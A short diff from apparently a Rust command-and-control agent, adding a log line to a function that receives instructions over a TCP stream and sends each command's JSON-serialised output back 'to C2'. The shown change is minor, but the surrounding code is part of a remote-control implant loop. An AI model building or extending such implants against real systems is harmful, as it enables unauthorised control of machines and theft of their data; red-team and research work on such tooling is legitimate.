@@ -57,6 +57,7 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
                                     output: Some(output),
                                 };
                                 let response_json = serde_json::to_string(&response).expect("Failed to serialize command response") + "\n";
+                                println!("[I] Command {} output sent to C2", command.name);
                                 stream.write_all(response_json.as_bytes())?;
                                 stream.flush()?;
                             },
